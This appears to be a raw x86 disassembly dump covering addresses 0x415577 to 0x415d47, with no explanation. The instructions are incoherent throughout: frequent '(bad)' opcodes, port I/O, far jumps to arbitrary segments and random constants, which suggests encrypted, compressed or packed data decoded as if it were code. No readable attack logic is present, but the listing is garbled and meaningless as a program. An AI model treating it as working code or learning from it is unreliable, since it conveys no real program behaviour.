  415577:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415579:	loope  0x41558b
  41557b:	lea    edi,[ebx-0x27c9c535]
  415581:	cdq    
  415582:	rcl    DWORD PTR [esi],1
  415584:	fdivr  QWORD PTR [ebx+eiz*1+0x47]
  415588:	out    dx,al
  415589:	and    bl,ah
  41558b:	sahf   
  41558c:	into   
  41558d:	retf   
  41558e:	clc    
  41558f:	jo     0x41558b
  415591:	rcr    BYTE PTR [esi],1
  415593:	outs   dx,BYTE PTR ds:[esi]
  415594:	bound  eax,QWORD PTR [ecx+0x3e4def4f]
  41559a:	push   eax
  41559b:	pop    ebx
  41559c:	sub    eax,0x4fe61d0
  4155a1:	pop    ebp
  4155a2:	cld    
  4155a3:	mov    al,0xdc
  4155a5:	sar    BYTE PTR [ebx+0x75526974],1
  4155ab:	lahf   
  4155ac:	icebp  
  4155ad:	jbe    0x415625
  4155af:	cmc    
  4155b0:	adc    DWORD PTR [ebp-0x55],eax
  4155b3:	sbb    eax,0x48321b20
  4155b8:	in     al,dx
  4155b9:	sbb    al,0x7b
  4155bb:	push   0x6b2382e7
  4155c0:	aam    0xf0
  4155c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4155c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4155c4:	test   al,0x20
  4155c6:	repz sbb edx,DWORD PTR [eax]
  4155c9:	xor    eax,0x699727e4
  4155ce:	mov    esi,0xa2d3583d
  4155d3:	xchg   esp,eax
  4155d4:	popa   
  4155d5:	mov    bh,0x69
  4155d7:	iret   
  4155d8:	inc    edi
  4155d9:	idiv   ebp
  4155db:	xchg   edi,eax
  4155dc:	xchg   esp,eax
  4155dd:	in     al,dx
  4155de:	xchg   edx,eax
  4155df:	cmc    
  4155e0:	std    
  4155e1:	fist   WORD PTR [ecx+eiz*8]
  4155e4:	and    edx,ebx
  4155e6:	imul   ebp,DWORD PTR [eax+0x511bfb48],0x18567202
  4155f0:	mov    edi,0xbfc4f982
  4155f5:	jmp    0x415623
  4155f7:	aad    0xcc
  4155f9:	cmp    ah,BYTE PTR [ecx-0x31]
  4155fc:	test   eax,0x9e17a251
  415601:	jmp    0xa3cb8669
  415606:	inc    ebx
  415607:	sbb    cl,dh
  415609:	jl     0x4155ff
  41560b:	push   ss
  41560c:	loope  0x415679
  41560e:	loopne 0x4155ce
  415610:	out    dx,eax
  415611:	(bad)  
  415612:	mov    ah,0x7f
  415614:	add    BYTE PTR [edx-0x5e],0x1e
  415618:	sub    esp,DWORD PTR [esi]
  41561a:	or     DWORD PTR [ebx+esi*1+0x25],edi
  41561e:	xchg   ebx,eax
  415620:	sub    eax,0xe316c98c
  415625:	sti    
  415626:	adc    BYTE PTR [edx],cl
  415628:	pop    ds
  415629:	inc    esp
  41562a:	pextrw ebx,mm6,0xc
  41562e:	inc    edx
  41562f:	pop    ebx
  415630:	fdivr  st,st(2)
  415632:	mov    esp,ds
  415634:	fistp  WORD PTR [eax+0x66]
  415637:	xor    BYTE PTR [ecx-0x98b651d],ch
  41563d:	nop
  41563e:	mov    esi,0x35991a56
  415643:	mov    ds:0xcae9375,al
  415648:	mov    cs,WORD PTR [ecx-0x11466384]
  41564e:	leave  
  41564f:	stos   BYTE PTR es:[edi],al
  415650:	scas   al,BYTE PTR es:[edi]
  415651:	imul   eax,DWORD PTR [edx],0x77ceeb7d
  415657:	inc    edx
  415658:	and    eax,0x770b5572
  41565d:	aad    0xc3
  41565f:	jmp    0x7a1581b5
  415664:	sbb    esp,0xcafb1412
  41566a:	or     ebx,DWORD PTR [edx]
  41566c:	mov    bh,0x96
  41566e:	inc    esi
  41566f:	and    BYTE PTR cs:[ebx+0x40d5a79c],cl
  415676:	xchg   esp,eax
  415677:	xor    BYTE PTR [esi],ch
  415679:	je     0x41565e
  41567b:	adc    DWORD PTR [eax+edi*1-0x35],eax
  41567f:	loop   0x41566c
  415681:	pop    esi
  415682:	cs jbe 0x415659
  415685:	iret   
  415686:	inc    esp
  415687:	cvttps2pi mm6,QWORD PTR [edi-0x15]
  41568b:	sti    
  41568c:	sub    esi,DWORD PTR [eax+ebp*2]
  41568f:	mov    ?,WORD PTR [eax+ebp*1-0x238864a6]
  415696:	xor    dl,ah
  415698:	cmp    BYTE PTR [edi+0x33ebcfe2],ah
  41569e:	pop    edx
  41569f:	(bad)  
  4156a1:	push   ebp
  4156a2:	and    ebp,DWORD PTR [ebx]
  4156a4:	push   ebx
  4156a5:	and    al,0xfa
  4156a7:	adc    DWORD PTR [eax+0x43951679],edi
  4156ad:	mov    eax,ds:0x16de2c44
  4156b2:	in     al,dx
  4156b3:	(bad)  
  4156b4:	call   0xe7c7401b
  4156b9:	test   BYTE PTR [eax+esi*1-0x3d1f2c56],al
  4156c0:	or     eax,0x8889293c
  4156c5:	clc    
  4156c6:	dec    eax
  4156c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4156c8:	das    
  4156c9:	das    
  4156ca:	ins    DWORD PTR es:[di],dx
  4156cc:	test   eax,0xaec91401
  4156d1:	les    ecx,FWORD PTR [ebp-0x248d87b9]
  4156d7:	jecxz  0x415709
  4156d9:	aaa    
  4156da:	mov    WORD PTR [esi],ds
  4156dc:	cli    
  4156dd:	jmp    0x230b:0xc30bd67d
  4156e4:	out    0x2c,eax
  4156e6:	sbb    BYTE PTR ds:0x5822c4ba,al
  4156ec:	mov    edi,0xfd65cce1
  4156f1:	rol    BYTE PTR [edi+0x2d],cl
  4156f4:	and    ah,dl
  4156f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4156f7:	jb     0x4156df
  4156f9:	jecxz  0x415751
  4156fb:	(bad)  
  4156fd:	aas    
  4156fe:	or     al,0xcd
  415700:	retf   0x1583
  415703:	scas   eax,DWORD PTR es:[edi]
  415704:	pop    edi
  415705:	cld    
  415706:	mov    eax,0x5841cd89
  41570b:	push   ds
  41570c:	jp     0x415738
  41570e:	(bad)  
  41570f:	pop    eax
  415710:	add    al,ch
  415712:	test   BYTE PTR [ebp-0x17],bh
  415715:	sub    al,BYTE PTR [eax+0x7cb7ca38]
  41571b:	mov    BYTE PTR [esi],0x9b
  41571e:	sbb    bh,BYTE PTR [ecx]
  415720:	pop    edx
  415721:	pop    eax
  415722:	inc    esp
  415723:	mov    ebp,0xf0e935aa
  415728:	inc    ecx
  415729:	ja     0x415700
  41572b:	ja     0x41578f
  41572d:	and    DWORD PTR [esi+0x44e3ddf8],edi
  415733:	ja     0x415785
  415735:	push   esp
  415736:	mov    dl,0xf9
  415738:	pop    ss
  415739:	shl    BYTE PTR [edx-0x37b91845],0x69
  415740:	cmc    
  415741:	stos   BYTE PTR es:[edi],al
  415742:	sar    DWORD PTR [esp+edi*1+0x7a135791],1
  415749:	(bad)  
  41574a:	mov    es,WORD PTR [edx-0x6e]
  41574d:	sbb    BYTE PTR [edx-0x1eb47ca0],dh
  415753:	pop    edi
  415754:	ins    DWORD PTR es:[edi],dx
  415755:	cld    
  415756:	out    dx,al
  415757:	test   eax,0x7cc20f04
  41575c:	mov    edi,0x1b6abe03
  415761:	ins    BYTE PTR es:[edi],dx
  415762:	push   0x76
  415764:	inc    ebx
  415765:	dec    esi
  415766:	(bad)  
  415767:	cmp    al,0x5
  415769:	mov    ebp,0xaeac49e1
  41576e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41576f:	inc    ebp
  415770:	cmp    al,0xf
  415772:	xor    al,0x58
  415774:	jecxz  0x41578a
  415776:	mov    ch,0x14
  415778:	addr16 or cl,bh
  41577b:	sbb    cl,BYTE PTR [eax]
  41577d:	push   edx
  41577e:	in     al,0x62
  415780:	adc    BYTE PTR [esi+edx*1+0x5522cce0],cl
  415787:	scas   eax,DWORD PTR es:[edi]
  415788:	scas   eax,DWORD PTR es:[edi]
  415789:	arpl   WORD PTR [edi+0x34],di
  41578c:	outs   dx,DWORD PTR ds:[esi]
  41578d:	cs add eax,0x9ac7b3fe
  415793:	cmp    eax,0xc117ba9a
  415798:	call   0x957b:0x40ce8a9
  41579f:	xor    eax,0x20c8981f
  4157a4:	dec    esi
  4157a5:	or     al,0x31
  4157a7:	jmp    0xfe480d4d
  4157ac:	add    DWORD PTR [ebx-0x100c021b],ebx
  4157b2:	jmp    0xa152c4c5
  4157b7:	pop    eax
  4157b8:	push   esi
  4157b9:	push   ecx
  4157ba:	scas   al,BYTE PTR es:[edi]
  4157bb:	mov    WORD PTR [esi+0x74],fs
  4157be:	lods   al,BYTE PTR ds:[esi]
  4157bf:	add    ebx,DWORD PTR [eax]
  4157c1:	inc    esp
  4157c2:	ja     0x415839
  4157c4:	xchg   ebp,eax
  4157c5:	jae    0x41582d
  4157c7:	movaps xmm2,XMMWORD PTR [ecx]
  4157ca:	mov    bh,0xd3
  4157cc:	add    BYTE PTR [ecx-0x2f501d43],0xb5
  4157d3:	mov    al,0x40
  4157d5:	sub    al,0x2b
  4157d7:	repnz out dx,al
  4157d9:	and    eax,0x283e0ddc
  4157de:	(bad)  [ecx+0x748890cb]
  4157e4:	mov    dh,0xb9
  4157e6:	mov    ?,WORD PTR [eax+0x33]
  4157e9:	jl     0x41580d
  4157eb:	aad    0xfa
  4157ed:	daa    
  4157ee:	sbb    ebx,DWORD PTR [esi+esi*8+0x5af60f76]
  4157f5:	sbb    esi,edx
  4157f7:	fstp   TBYTE PTR [edi]
  4157f9:	sbb    ah,al
  4157fb:	push   0x867f5947
  415800:	push   eax
  415801:	in     eax,dx
  415802:	sub    dh,dh
  415804:	int3   
  415805:	fs div esp
  415808:	add    BYTE PTR [edx+0xd],ah
  41580b:	aas    
  41580c:	retf   
  41580d:	fld    DWORD PTR [eax-0x68]
  415810:	inc    ecx
  415811:	xor    al,0x96
  415813:	jmp    0x415805
  415815:	fs scas al,BYTE PTR es:[edi]
  415817:	mov    edi,0x254f43ba
  41581c:	ins    BYTE PTR es:[edi],dx
  41581d:	gs push edi
  41581f:	xchg   ebp,eax
  415820:	sub    BYTE PTR [edi],dh
  415822:	and    al,0xa8
  415824:	aam    0x16
  415826:	mov    eax,0xe374b5fe
  41582b:	nop
  41582c:	adc    BYTE PTR [ebp-0x9b5ffd7],bl
  415832:	nop
  415833:	and    esi,DWORD PTR [edi]
  415835:	retf   
  415836:	leave  
  415837:	data16 aaa 
  415839:	jne    0x415881
  41583b:	cmp    al,0xfa
  41583d:	add    cl,BYTE PTR [ecx+0x485ac513]
  415843:	jle    0x415825
  415845:	dec    edi
  415846:	(bad)  
  415847:	(bad)  
  415848:	sbb    BYTE PTR [edx+0x5d],ah
  41584b:	test   eax,0x7f3fa3f
  415850:	add    DWORD PTR [eax],esi
  415852:	fldcw  WORD PTR [edi-0x634ae010]
  415858:	push   edx
  415859:	cmp    al,0xf2
  41585b:	stos   DWORD PTR es:[edi],eax
  41585c:	xchg   esp,eax
  41585d:	popa   
  41585e:	nop
  41585f:	retf   0x455c
  415862:	push   0xdc0209a8
  415867:	je     0x41583b
  415869:	sbb    al,BYTE PTR [edi+0x676a2940]
  41586f:	mov    DWORD PTR [edi+esi*1+0x34869cb7],ebp
  415876:	fdiv   st,st(7)
  415878:	sbb    esp,DWORD PTR [ebp+edx*1+0x7]
  41587c:	and    cl,BYTE PTR [eax-0x7e]
  41587f:	fsubr  DWORD PTR [eax]
  415881:	inc    eax
  415882:	repnz aam 0x5d
  415885:	cmp    BYTE PTR [ebp-0x77143101],ch
  41588b:	or     al,0x57
  41588d:	mov    WORD PTR [ebp+0x6d15f3c4],cs
  415893:	aas    
  415894:	clc    
  415895:	cmp    al,0x17
  415897:	pushf  
  415898:	or     BYTE PTR [esi-0x67250e6],cl
  41589e:	lods   eax,DWORD PTR ds:[esi]
  41589f:	pushf  
  4158a0:	hlt    
  4158a1:	mov    eax,0x9c10ec09
  4158a6:	xor    DWORD PTR [ebx-0x3],ebx
  4158a9:	xor    eax,0x1cbd6445
  4158ae:	cmp    al,0x17
  4158b0:	std    
  4158b1:	and    dl,BYTE PTR [eax-0x365e690e]
  4158b7:	idiv   DWORD PTR [ebx-0x39c2e6b2]
  4158bd:	mov    al,0x20
  4158bf:	add    DWORD PTR [esi+0x227c5b7e],eax
  4158c5:	jmp    0x500e:0xbd63dca3
  4158cc:	lods   eax,DWORD PTR ds:[esi]
  4158cd:	fstp   st(0)
  4158cf:	xchg   ecx,eax
  4158d0:	bound  edx,QWORD PTR [eax]
  4158d2:	shr    DWORD PTR [ecx+0x2d],cl
  4158d5:	mov    dh,0x21
  4158d7:	mov    dh,0x4
  4158d9:	aas    
  4158da:	enter  0xbee8,0x47
  4158de:	(bad)  
  4158df:	fst    DWORD PTR [ebx-0x54f1e4]
  4158e5:	and    al,0x9f
  4158e7:	(bad)  
  4158e9:	imul   esi,DWORD PTR [edx],0xffffffbf
  4158ec:	lock sbb ah,BYTE PTR [edx+0x38740cb3]
  4158f3:	lds    esp,FWORD PTR [ebp+0x4e]
  4158f6:	icebp  
  4158f7:	fistp  WORD PTR [ecx+0x5]
  4158fa:	neg    DWORD PTR [esi]
  4158fc:	and    bl,BYTE PTR [edi-0x70]
  4158ff:	mov    ecx,0xcb41447a
  415904:	pcmpgtd mm4,QWORD PTR [eax+0x30bd340a]
  41590b:	jb     0x415964
  41590d:	in     eax,dx
  41590e:	and    al,0x42
  415910:	pop    esp
  415911:	mov    esi,0xde471ae7
  415916:	add    dl,BYTE PTR [ebp+0x27]
  415919:	xlat   BYTE PTR ds:[ebx]
  41591a:	mov    ebp,0xe35601fe
  41591f:	inc    edx
  415920:	lods   al,BYTE PTR ds:[esi]
  415921:	hlt    
  415922:	test   al,0xc2
  415924:	cmp    bl,ah
  415926:	add    al,0xce
  415928:	cdq    
  415929:	rep ins DWORD PTR es:[edi],dx
  41592b:	out    dx,eax
  41592c:	fdiv   QWORD PTR [ebx-0x75d70a1e]
  415932:	in     eax,dx
  415933:	pop    ebx
  415934:	mov    dl,0x9c
  415936:	jbe    0x415921
  415938:	cmp    eax,0x8f2b3950
  41593d:	test   BYTE PTR [edx+edx*8-0x53],dh
  415941:	test   eax,0x355f13fc
  415946:	mov    bh,0x59
  415948:	cmp    edx,ebx
  41594a:	in     eax,0x8d
  41594c:	in     eax,0x21
  41594e:	hlt    
  41594f:	jecxz  0x4159b1
  415951:	mov    ebp,0x9c8642c8
  415956:	sbb    BYTE PTR [edx+0x5ab774b6],0x26
  41595d:	push   ss
  41595e:	inc    esi
  41595f:	test   DWORD PTR [eiz*4-0x7ec51fc],ecx
  415966:	les    edx,FWORD PTR [edi]
  415968:	inc    edx
  415969:	inc    edx
  41596a:	mov    bh,0x30
  41596c:	sbb    BYTE PTR [eax+0x2a],cl
  41596f:	icebp  
  415970:	clc    
  415971:	adc    al,0xec
  415973:	out    0x1f,eax
  415975:	and    cl,BYTE PTR [eax+0x14]
  415978:	lods   al,BYTE PTR ds:[esi]
  415979:	pop    ecx
  41597a:	adc    edi,DWORD PTR [ecx-0xdfc483c]
  415980:	popa   
  415981:	xchg   ebx,ebp
  415983:	and    DWORD PTR [eax-0x3b54a8ea],esp
  415989:	retf   
  41598a:	pop    esp
  41598b:	and    edi,DWORD PTR [ebx-0x559a3dbc]
  415991:	sbb    eax,0x20b67ea4
  415996:	int3   
  415997:	xadd   bl,bh
  41599a:	mov    al,ds:0x135a2b58
  41599f:	sti    
  4159a0:	les    ecx,FWORD PTR [esi+0x154aa258]
  4159a6:	add    DWORD PTR [edx-0x5a046533],ecx
  4159ac:	sbb    ch,BYTE PTR [edx-0x50ac4cb1]
  4159b2:	add    al,cl
  4159b4:	arpl   WORD PTR [ecx-0x2a],bp
  4159b7:	pop    ebx
  4159b8:	sub    ebp,DWORD PTR [ebx]
  4159ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4159bb:	call   0xaf5f:0x4ac68bf2
  4159c2:	inc    edx
  4159c3:	add    eax,0x933a104b
  4159c8:	cmp    ebx,esp
  4159ca:	inc    edx
  4159cb:	pop    ds
  4159cc:	clc    
  4159cd:	(bad)  
  4159ce:	xor    al,0x3b
  4159d0:	aas    
  4159d1:	mov    ah,0xe0
  4159d3:	mov    bl,dl
  4159d5:	adc    BYTE PTR [edx-0x9],cl
  4159d8:	repnz mov bh,0xab
  4159db:	sub    ebp,esi
  4159dd:	div    DWORD PTR [edx+ecx*8-0x5605f73c]
  4159e4:	or     BYTE PTR [ebp+eax*8+0x10],cl
  4159e8:	aam    0x1c
  4159ea:	lea    ebp,[edx-0x27cc13ff]
  4159f0:	add    ecx,DWORD PTR [edx+0x67fb7982]
  4159f6:	lods   eax,DWORD PTR ds:[esi]
  4159f7:	rol    DWORD PTR [ebx+0x2e20f78f],1
  4159fd:	mov    ch,0xdc
  4159ff:	push   esp
  415a00:	inc    esp
  415a01:	pushf  
  415a02:	push   ebx
  415a03:	xchg   ebx,eax
  415a04:	xchg   ebp,eax
  415a05:	or     al,0xad
  415a07:	into   
  415a08:	gs xchg edx,eax
  415a0a:	pusha  
  415a0b:	dec    edi
  415a0c:	das    
  415a0d:	call   0x3a7094f
  415a12:	pop    es
  415a13:	or     edx,DWORD PTR [ecx+0x22d5a733]
  415a19:	out    0xa6,al
  415a1b:	scas   eax,DWORD PTR es:[edi]
  415a1c:	ins    BYTE PTR es:[edi],dx
  415a1d:	cwde   
  415a1e:	mov    eax,ds:0xacba9b6a
  415a23:	push   0x90f60856
  415a28:	mov    cl,0xc3
  415a2a:	cwde   
  415a2b:	cmp    BYTE PTR [edi+edx*2-0x49856f78],dh
  415a32:	jo     0x415a48
  415a34:	out    0x11,eax
  415a36:	push   ecx
  415a37:	sbb    edi,edi
  415a39:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a3a:	xchg   ebp,eax
  415a3b:	jae    0x415aa4
  415a3d:	arpl   WORD PTR [edx],di
  415a3f:	pop    ds
  415a40:	adc    DWORD PTR [ecx-0x5f],edx
  415a43:	adc    dh,0xfe
  415a46:	jmp    0x7ad485e8
  415a4b:	push   ebx
  415a4c:	scas   eax,DWORD PTR es:[edi]
  415a4d:	inc    edx
  415a4e:	pop    ds
  415a4f:	sub    DWORD PTR [esi+0x7a],esp
  415a52:	mov    bl,0xab
  415a54:	cdq    
  415a55:	push   ebp
  415a56:	ja     0x415aaa
  415a58:	mov    ch,0xcb
  415a5a:	and    eax,0x6bb2ec04
  415a5f:	nop
  415a60:	mov    edx,0xd109c86f
  415a65:	jmp    0xf31b98f1
  415a6a:	ins    BYTE PTR es:[edi],dx
  415a6b:	add    dl,al
  415a6d:	dec    esi
  415a6e:	sar    DWORD PTR [eax+0x61],0xff
  415a72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a73:	pop    ebx
  415a74:	int3   
  415a75:	imul   edi,DWORD PTR [eax],0x8c696fbe
  415a7b:	gs iret 
  415a7d:	gs push ebx
  415a7f:	aam    0xb6
  415a81:	test   eax,0x37a7121e
  415a86:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415a87:	aas    
  415a88:	gs das 
  415a8a:	adc    al,0xfc
  415a8c:	and    ch,bl
  415a8e:	push   ss
  415a8f:	jmp    0xb5b19918
  415a94:	loopne 0x415aa0
  415a96:	xor    dh,BYTE PTR [esi+0x937a9c5]
  415a9c:	dec    ebx
  415a9d:	call   0xd502:0x8518b38d
  415aa4:	push   edi
  415aa5:	mov    eax,ds:0xe9267293
  415aaa:	mov    ah,bh
  415aac:	push   ebx
  415aad:	pop    eax
  415aae:	pop    edi
  415aaf:	test   DWORD PTR [ebp+0x6d],esi
  415ab2:	push   ebp
  415ab3:	test   eax,0xae3a1431
  415ab8:	pop    esi
  415ab9:	mov    ds:0x3a047432,al
  415abe:	adc    BYTE PTR [eax],bh
  415ac0:	mov    al,ds:0xb0aed7b9
  415ac5:	aad    0x1a
  415ac7:	mov    eax,ds:0xfd6770a
  415acc:	mov    dh,0x8d
  415ace:	test   BYTE PTR [esi+0xf],bh
  415ad1:	bound  esi,QWORD PTR [esi+edx*4+0x26]
  415ad5:	pusha  
  415ad6:	mov    ds:0x7a55a382,eax
  415adb:	(bad)  
  415adc:	out    dx,eax
  415add:	mov    bh,0x2e
  415adf:	in     eax,0xea
  415ae1:	xchg   ebx,eax
  415ae2:	mov    ds:0xd5268454,al
  415ae7:	adc    DWORD PTR [ebp+0x46e68509],ebx
  415aed:	test   al,0x1b
  415aef:	aad    0xcf
  415af1:	sub    bh,BYTE PTR es:[edx]
  415af4:	pop    ebp
  415af5:	loopne 0x415ad1
  415af7:	mov    BYTE PTR [eax],bh
  415af9:	scas   al,BYTE PTR es:[edi]
  415afa:	mov    ebx,esi
  415afc:	ins    BYTE PTR es:[edi],dx
  415afd:	loopne 0x415ac5
  415aff:	cmp    bh,BYTE PTR [ebx+ebx*8]
  415b02:	sbb    BYTE PTR [eax+0x7b],ch
  415b05:	inc    edx
  415b06:	sbb    DWORD PTR ss:[esi],ebp
  415b09:	push   ecx
  415b0a:	sbb    edx,DWORD PTR [ebx+0x26]
  415b0d:	jb     0x415b06
  415b0f:	or     DWORD PTR [ecx+edi*8+0x14af024a],0x7eafa35b
  415b1a:	fild   DWORD PTR [esi+0x16]
  415b1d:	sbb    al,0x27
  415b1f:	push   ebx
  415b20:	inc    edi
  415b21:	pushf  
  415b22:	inc    esp
  415b23:	bound  ebx,QWORD PTR [ebx+ebp*4-0x5b0b3f5f]
  415b2a:	ins    BYTE PTR es:[edi],dx
  415b2b:	or     ebx,DWORD PTR [edi-0x2b]
  415b2e:	xchg   esi,eax
  415b2f:	push   eax
  415b30:	test   al,0x47
  415b32:	in     eax,0x27
  415b34:	jns    0x415b80
  415b36:	icebp  
  415b37:	retf   
  415b38:	and    esp,DWORD PTR ds:0x72204526
  415b3e:	dec    esi
  415b3f:	hlt    
  415b40:	mov    edi,0x658b92fc
  415b45:	shr    BYTE PTR [eax],1
  415b47:	adc    BYTE PTR es:[eax-0x58],bl
  415b4b:	aam    0x43
  415b4d:	mul    BYTE PTR [edi-0x11]
  415b50:	repnz add BYTE PTR [esi-0x70714742],0xe0
  415b58:	enter  0x395b,0x52
  415b5c:	mov    ch,0xee
  415b5e:	push   ebp
  415b5f:	test   bh,0x37
  415b62:	js     0x415b4f
  415b64:	add    BYTE PTR [ebx-0x25],dl
  415b67:	cs jno 0x415b19
  415b6a:	jmp    0x415b53
  415b6c:	adc    al,0xc7
  415b6e:	pop    esp
  415b6f:	push   es
  415b70:	xor    eax,0xa2d63406
  415b75:	adc    DWORD PTR ds:0xd178e5e4,eax
  415b7b:	cmp    eax,0x4d8d97dd
  415b80:	pop    ebx
  415b81:	push   0x60
  415b83:	lods   al,BYTE PTR ds:[esi]
  415b84:	mov    ah,al
  415b86:	xchg   ebx,eax
  415b87:	scas   al,BYTE PTR es:[edi]
  415b88:	adc    BYTE PTR [eax],bl
  415b8a:	fcmovbe st,st(7)
  415b8c:	xor    DWORD PTR [esi-0x4ce81c9c],edx
  415b92:	jmp    0xa9be:0x8c7bef6e
  415b99:	push   ecx
  415b9a:	or     dh,BYTE PTR [edx-0x279a7af0]
  415ba0:	in     eax,dx
  415ba1:	icebp  
  415ba2:	jl     0x415b50
  415ba4:	iret   
  415ba5:	cmp    ah,ah
  415ba7:	scas   eax,DWORD PTR es:[edi]
  415ba8:	(bad)
  415bab:	loopne 0x415b7a
  415bad:	mov    bl,0x15
  415baf:	dec    esp
  415bb0:	add    ah,BYTE PTR [ebx]
  415bb2:	ret    
  415bb3:	and    eax,0x7e14aafc
  415bb8:	ret    
  415bb9:	jge    0x415bfd
  415bbb:	popa   
  415bbc:	shl    DWORD PTR ds:0xd4323a96,cl
  415bc2:	loope  0x415c2d
  415bc4:	xor    BYTE PTR [edi],dl
  415bc6:	loop   0x415bb2
  415bc8:	retf   
  415bc9:	loope  0x415c06
  415bcb:	shr    ebp,0x8c
  415bce:	xchg   edx,eax
  415bcf:	repnz xor al,0x53
  415bd2:	mov    ebx,0x4f8e9f03
  415bd7:	mov    cl,0x6
  415bd9:	div    ah
  415bdb:	add    ah,al
  415bdd:	mov    edi,0x669cbf9f
  415be2:	mov    bh,BYTE PTR [eax-0x6a]
  415be5:	outs   dx,BYTE PTR ds:[esi]
  415be6:	retf   
  415be7:	jmp    0xc600:0x21d94ba4
  415bee:	mov    eax,0xbb2d2380
  415bf3:	mov    ah,al
  415bf5:	adc    edx,eax
  415bf7:	cmp    DWORD PTR [eax+edx*8+0x18],ecx
  415bfb:	loope  0x415bf9
  415bfd:	es addr16 push es
  415c00:	(bad)  
  415c01:	imul   edi,DWORD PTR [edx],0x2f7d1dd1
  415c07:	sub    dl,dl
  415c09:	call   esi
  415c0b:	loope  0x415c20
  415c0d:	mov    ebx,0xa945e368
  415c12:	fsub   DWORD PTR [ebx+0x1e5839f2]
  415c18:	daa    
  415c19:	inc    edx
  415c1a:	imul   BYTE PTR [ecx-0x4e]
  415c1d:	sbb    eax,0x587c34a0
  415c22:	and    BYTE PTR [ecx+0x1d],dl
  415c25:	add    esp,DWORD PTR [ebx-0x2a]
  415c28:	and    dl,BYTE PTR [ebx+eax*8]
  415c2b:	xchg   esp,eax
  415c2c:	int    0x2f
  415c2e:	cmp    dl,BYTE PTR [ecx]
  415c30:	aaa    
  415c31:	icebp  
  415c32:	in     al,dx
  415c33:	in     eax,dx
  415c34:	or     ebp,ebx
  415c36:	jae    0x415c37
  415c38:	mov    ds:0x987955df,eax
  415c3d:	dec    esp
  415c3e:	shl    DWORD PTR [edi+0x34],cl
  415c41:	(bad)  
  415c42:	(bad)  
  415c43:	aas    
  415c44:	fnstsw WORD PTR [ebx]
  415c46:	repz bound edx,QWORD PTR [ebp+0x5a]
  415c4a:	iret   
  415c4b:	mov    ebp,0xbbee6451
  415c50:	add    BYTE PTR [ebx],dh
  415c52:	fbstp  TBYTE PTR [ebx]
  415c55:	(bad)  
  415c56:	mov    ecx,ds
  415c58:	xor    ch,BYTE PTR [ebx+esi*2+0x38]
  415c5c:	add    al,0x7d
  415c5e:	push   0xffffffc6
  415c60:	cmp    eax,0xcaab55e0
  415c65:	fisttp DWORD PTR [ebx]
  415c67:	mov    ?,WORD PTR [eax]
  415c69:	data16 add bl,BYTE PTR [esi]
  415c6c:	(bad)  
  415c6d:	aam    0xb
  415c6f:	xlat   BYTE PTR ds:[ebx]
  415c70:	(bad)  
  415c71:	or     eax,0xf103dfee
  415c76:	mov    ch,0xc5
  415c78:	in     eax,dx
  415c79:	jbe    0x415c7f
  415c7b:	or     al,0xb6
  415c7d:	mov    WORD PTR [edx+eiz*2+0x2712b0cd],cs
  415c84:	mov    DWORD PTR [ebx],ebx
  415c86:	shl    BYTE PTR [ebp-0x408d43f6],0x64
  415c8d:	sar    esp,0xd1
  415c90:	and    ebx,DWORD PTR [eax]
  415c92:	jle    0x415cc1
  415c94:	dec    edi
  415c95:	xor    DWORD PTR [esi+0x59],eax
  415c98:	aad    0x40
  415c9a:	xchg   ecx,eax
  415c9b:	test   al,0xbd
  415c9d:	and    bh,BYTE PTR [ebp+0x25]
  415ca0:	cwde   
  415ca1:	adc    bh,ah
  415ca3:	push   ds
  415ca4:	mov    bh,0x90
  415ca6:	hlt    
  415ca7:	cwde   
  415ca8:	imul   BYTE PTR [ecx-0x22111e12]
  415cae:	les    esi,FWORD PTR es:0x37b5518a
  415cb5:	push   0x31f84e21
  415cba:	and    eax,0x65c290cd
  415cbf:	(bad)  
  415cc0:	fisub  DWORD PTR [edx+0x6f8eb02b]
  415cc6:	push   es
  415cc7:	dec    edx
  415cc8:	mov    edx,DWORD PTR [ecx+eiz*2]
  415ccb:	add    dl,ah
  415ccd:	sbb    esi,ecx
  415ccf:	in     eax,dx
  415cd0:	pop    esi
  415cd1:	adc    eax,0xf3e13f82
  415cd6:	jo     0x415ca6
  415cd8:	ins    DWORD PTR es:[edi],dx
  415cd9:	dec    ebp
  415cda:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415cdb:	mov    bl,0xd8
  415cdd:	or     bh,BYTE PTR ds:0xcd8d12ae
  415ce3:	mov    al,ds:0xc35c8cb0
  415ce8:	jnp    0x415c87
  415cea:	mov    es,WORD PTR [ecx-0x43b43a19]
  415cf0:	cmp    cl,cl
  415cf2:	mov    ch,0xc0
  415cf4:	jae    0x415cb7
  415cf6:	push   esp
  415cf7:	cmp    ecx,DWORD PTR [eax]
  415cf9:	inc    esi
  415cfa:	(bad)  
  415cfb:	mov    cl,0x8b
  415cfd:	mov    dl,0x28
  415cff:	lahf   
  415d00:	cmp    BYTE PTR [ebx+eiz*4],ah
  415d03:	lock or BYTE PTR [ebx-0xff97c37],0xe6
  415d0b:	scas   eax,DWORD PTR es:[edi]
  415d0c:	outs   dx,BYTE PTR ds:[esi]
  415d0d:	add    BYTE PTR [eax-0x4060d496],cl
  415d13:	pusha  
  415d14:	outs   dx,DWORD PTR ds:[esi]
  415d15:	jecxz  0x415ca4
  415d17:	loopne 0x415d84
  415d19:	sbb    DWORD PTR [edx+0x7a479f1c],0xbe48bf2d
  415d23:	neg    BYTE PTR [edx]
  415d25:	push   esi
  415d26:	mov    ebx,0xa16cf1d5
  415d2b:	cmp    al,0x45
  415d2d:	je     0x415d41
  415d2f:	jae    0x415ce0
  415d31:	mov    eax,ds:0x291a8fed
  415d36:	addps  xmm1,XMMWORD PTR [esi+0x5c]
  415d3a:	lods   eax,DWORD PTR ds:[esi]
  415d3b:	push   ebp
  415d3c:	les    ecx,FWORD PTR [ebx]
  415d3e:	xor    DWORD PTR [eax-0x77],eax
  415d41:	pop    ss
  415d42:	arpl   WORD PTR [esi],ax
  415d44:	inc    ecx
  415d45:	fdivr  DWORD PTR [eax]
  415d47:	mov    dl,bl
